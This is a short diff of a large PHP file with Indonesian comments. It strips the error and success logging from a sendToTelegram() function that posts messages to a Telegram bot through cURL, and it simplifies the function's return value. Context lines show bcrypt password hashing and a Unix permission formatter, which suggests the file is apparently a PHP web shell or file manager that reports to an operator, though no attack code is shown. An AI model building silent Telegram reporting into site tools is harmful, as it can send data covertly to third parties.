@@ -11,7 +11,6 @@ function sendToTelegram($botToken, $chatID, $message) {
         'text' => $message
     ];
 
-    // Gunakan cURL untuk mengirimkan permintaan POST
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, 1);
@@ -21,16 +20,7 @@ function sendToTelegram($botToken, $chatID, $message) {
     $response = curl_exec($ch);
     curl_close($ch);
 
-    if ($response === FALSE) {
-        // Log error jika gagal mengirimkan pesan
-        error_log("Error sending message to Telegram using cURL");
-        return false;
-    } else {
-        // Log sukses jika pesan terkirim (hanya jika diperlukan untuk debug)
-        error_log("Message sent to Telegram: $response");
-    }
-
-    return $response;
+    return $response !== FALSE;
 }
 
 // Hash password bcrypt
@@ -1763,5 +1753,4 @@ function perms($file)
         (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-
 ?>
